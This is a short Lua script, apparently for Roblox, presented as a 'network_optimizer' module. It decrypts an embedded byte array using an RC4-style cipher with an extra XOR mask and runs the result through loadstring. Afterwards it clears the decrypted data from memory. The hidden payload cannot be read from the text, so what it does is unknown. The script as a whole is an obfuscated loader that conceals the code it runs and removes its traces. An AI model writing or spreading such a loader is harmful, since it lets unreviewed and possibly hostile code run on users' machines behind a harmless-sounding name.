-- Protected Segment (network_optimizer)
local rXogNTEb = 50
local tsifUmnv = {
{204,22,14,217,69,209,242,76,191,198,123,59,141,28,4,139,119,196,4,224,78,207,18,80,234,147,189,163,67,36,124,87,147,59,89,240,136,78,100,197,118,228,111,117,220,187,163,19,231,182,253,34,26,209,159,5,120,67,123,127},{74,130,196,193,94,126,215,155,5,72,10,155,67,79,195,134,130,139,192,50,21,26,138,136,163,229,41,251,94,148,241,122,113,25,49,40,64,148,104,44,137,154,229,76,98,185,150,37,65,152,101,146,248,248,207,78,50,92,141,24},{243,220,102,33,204,187,229,186,179,43,192,55,254,207,247,183,62,100,37,164,230,244,88,176,29,160,108,33,137}
}
local gATzDYdv = "ilkvvfuWqjiQvKam"

local function iIGAwLmu(FYlYudDC_data, FYlYudDC_key)
    local FYlYudDC = {}
    for ngbIUwXd = 0, 255 do FYlYudDC[ngbIUwXd] = ngbIUwXd end
    local euwLtHzP = 0
    for ngbIUwXd = 0, 255 do
        local RgXwWpXR = FYlYudDC_key:byte((ngbIUwXd % #FYlYudDC_key) + 1)
        euwLtHzP = (euwLtHzP + FYlYudDC[ngbIUwXd] + RgXwWpXR) % 256
        FYlYudDC[ngbIUwXd], FYlYudDC[euwLtHzP] = FYlYudDC[euwLtHzP], FYlYudDC[ngbIUwXd]
    end
    local ngbIUwXd = 0
    local euwLtHzP = 0
    local HsgVvAGN = {}
    for _, NOyCtZQK in ipairs(FYlYudDC_data) do
        ngbIUwXd = (ngbIUwXd + 1) % 256
        euwLtHzP = (euwLtHzP + FYlYudDC[ngbIUwXd]) % 256
        FYlYudDC[ngbIUwXd], FYlYudDC[euwLtHzP] = FYlYudDC[euwLtHzP], FYlYudDC[ngbIUwXd]
        local RgXwWpXR = FYlYudDC[(FYlYudDC[ngbIUwXd] + FYlYudDC[euwLtHzP]) % 256]
        local unmasked = bit32.bxor(NOyCtZQK, rXogNTEb)
        table.insert(HsgVvAGN, string.char(bit32.bxor(unmasked, RgXwWpXR)))
    end
    return table.concat(HsgVvAGN)
end

local FYlYudDC_flat = {}
for _, chunk in ipairs(tsifUmnv) do
    for _, byte in ipairs(chunk) do
        table.insert(FYlYudDC_flat, byte)
    end
end

local decrypted = iIGAwLmu(FYlYudDC_flat, gATzDYdv)
local EtZDNSnh, RvaOGmMh = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(FYlYudDC_flat)
FYlYudDC_flat = nil

if EtZDNSnh then 
    local result = EtZDNSnh() 
    decrypted = nil
    EtZDNSnh = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "network_optimizer" .. "): " .. tostring(RvaOGmMh)) 
end
